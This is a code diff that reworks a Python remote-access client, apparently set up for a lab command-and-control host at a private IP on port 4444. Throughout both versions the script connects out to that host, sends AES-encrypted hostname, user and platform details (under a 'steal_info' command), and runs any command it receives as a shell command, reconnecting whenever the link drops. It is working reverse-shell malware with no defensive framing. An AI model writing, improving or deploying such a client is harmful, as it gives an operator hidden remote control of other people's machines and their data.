@@ -1,145 +1,120 @@
-import socket
-import sys
-import os
-import json
-import subprocess
-import time
-import base64
-import platform
-import psutil
+#!/usr/bin/env python3
+import socket, sys, os, json, subprocess, time, base64, platform, psutil
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 
-# ====================== CONFIG ======================
-C2_IP   = "192.168.91.128"      # ← Your C2 host-only IP (from the screenshot)
+# ============ CHANGE THIS ============
+C2_IP   = "192.168.91.128"     # Your C2 IP from screenshot
 C2_PORT = 4444
+# =====================================
 
 AES_KEY = b'ThisIsA32ByteIVForAES256Encrypt!'
 AES_IV  = b'ThisIsA16ByteIV!'
-# ====================================================
 
-def encrypt(data, key=AES_KEY, iv=AES_IV):
+def encrypt(data):
     if isinstance(data, str):
         data = data.encode()
-    cipher = AES.new(key, AES.MODE_CBC, iv)
+    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
     return base64.b64encode(cipher.encrypt(pad(data, AES.block_size)))
 
-def decrypt(encrypted_data, key=AES_KEY, iv=AES_IV):
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    return unpad(cipher.decrypt(base64.b64decode(encrypted_data)), AES.block_size)
+def decrypt(data):
+    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
+    return unpad(cipher.decrypt(base64.b64decode(data)), AES.block_size)
 
-def get_system_info():
-    info = {
-        "platform": platform.system(),
-        "release": platform.release(),
-        "hostname": platform.node(),
-        "username": os.getenv("USER") or "unknown",
-        "local_ip": "unknown",
-        "ram_gb": round(psutil.virtual_memory().total / (1024**3), 2)
-    }
+def run_cmd(cmd):
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        info["local_ip"] = s.getsockname()[0]
-        s.close()
-    except:
-        pass
-    return info
-
-def run_command(cmd):
-    try:
-        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
-        return (result.stdout + result.stderr).strip() or "Command executed (no output)"
+        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
+        return (r.stdout + r.stderr).strip() or "[no output]"
     except Exception as e:
-        return f"Error: {str(e)}"
+        return f"Error: {e}"
 
-# Global connection
 connection = None
 
-def server(ip, port):
+def connect():
     global connection
     while True:
         try:
             connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            connection.connect((ip, port))
-            print(f"[+] Connected to C2 {ip}:{port}")
+            connection.connect((C2_IP, C2_PORT))
+            print(f"[+] Connected to {C2_IP}:{C2_PORT}")
             return
         except Exception as e:
-            print(f"[-] Connection failed: {e}. Retrying in 5 seconds...")
-            time.sleep(5)
+            print(f"[-] Connect failed: {e}")
+            time.sleep(4)
 
 def send(data):
     try:
-        if isinstance(data, (dict, list)):
+        if not isinstance(data, str):
             data = json.dumps(data)
-        encrypted = encrypt(data)
-        connection.send(encrypted)
+        connection.send(encrypt(data))
+        print(f"[>] Sent: {data[:80]}...")
     except Exception as e:
         print(f"[-] Send error: {e}")
-        server(C2_IP, C2_PORT)
+        connect()
 
 def receive():
-    data = b""
+    buf = b""
     while True:
         try:
             chunk = connection.recv(4096)
             if not chunk:
-                raise ConnectionError("Disconnected")
-            data += chunk
+                raise ConnectionError("disconnected")
+            buf += chunk
             try:
-                # Try to decrypt + parse as soon as we have enough data
-                decrypted = decrypt(data).decode()
-                return json.loads(decrypted) if decrypted.startswith("{") or decrypted.startswith("[") else decrypted
+                plain = decrypt(buf).decode()
+                print(f"[<] Received raw: {plain[:100]}")
+                # Try to parse as JSON, otherwise return as string
+                try:
+                    return json.loads(plain)
+                except:
+                    return plain
             except:
-                continue   # need more data
+                continue  # need more data
         except Exception as e:
             print(f"[-] Receive error: {e}")
-            server(C2_IP, C2_PORT)
+            connect()
             return None
 
-def run():
-    # Send initial info
-    send(get_system_info())
+def main():
+    connect()
+    # Send hello / system info
+    info = {
+        "hostname": platform.node(),
+        "user": os.getenv("USER", "unknown"),
+        "platform": platform.system(),
+        "ip": C2_IP
+    }
+    send(info)
 
     while True:
-        try:
-            command = receive()
-            if not command:
-                continue
+        cmd = receive()
+        if cmd is None:
+            continue
 
-            print(f"[*] Command received: {command}")
+        print(f"[*] Command: {cmd}")
 
-            if command in ["exit", "quit"]:
-                send("Client exiting...")
-                break
+        if isinstance(cmd, dict):
+            # some servers send dicts
+            cmd = cmd.get("command") or cmd.get("cmd") or str(cmd)
 
-            elif command in ["steal_info", "info", "sysinfo"]:
-                send(get_system_info())
-
-            elif command.startswith("cd "):
-                try:
-                    os.chdir(command[3:].strip())
-                    send(f"Changed to: {os.getcwd()}")
-                except Exception as e:
-                    send(str(e))
-
-            elif command == "pwd":
-                send(os.getcwd())
-
-            else:
-                # Execute any shell command
-                result = run_command(command)
-                send(result)
-
-        except KeyboardInterrupt:
+        if cmd in ["exit", "quit"]:
+            send("Bye")
             break
-        except Exception as e:
-            print(f"[-] Error: {e}")
-            time.sleep(2)
-            server(C2_IP, C2_PORT)
+        elif cmd in ["info", "steal_info", "sysinfo"]:
+            send(info)
+        elif cmd == "pwd":
+            send(os.getcwd())
+        elif cmd.startswith("cd "):
+            try:
+                os.chdir(cmd[3:].strip())
+                send(f"OK: {os.getcwd()}")
+            except Exception as e:
+                send(str(e))
+        else:
+            # Execute any other command
+            result = run_cmd(cmd)
+            send(result)
 
 if __name__ == "__main__":
-    print("[*] Linux-compatible client starting...")
-    print(f"[*] Target C2: {C2_IP}:{C2_PORT}")
-    server(C2_IP, C2_PORT)
-    run()
+    print("[*] Starting robust Linux client...")
+    main()
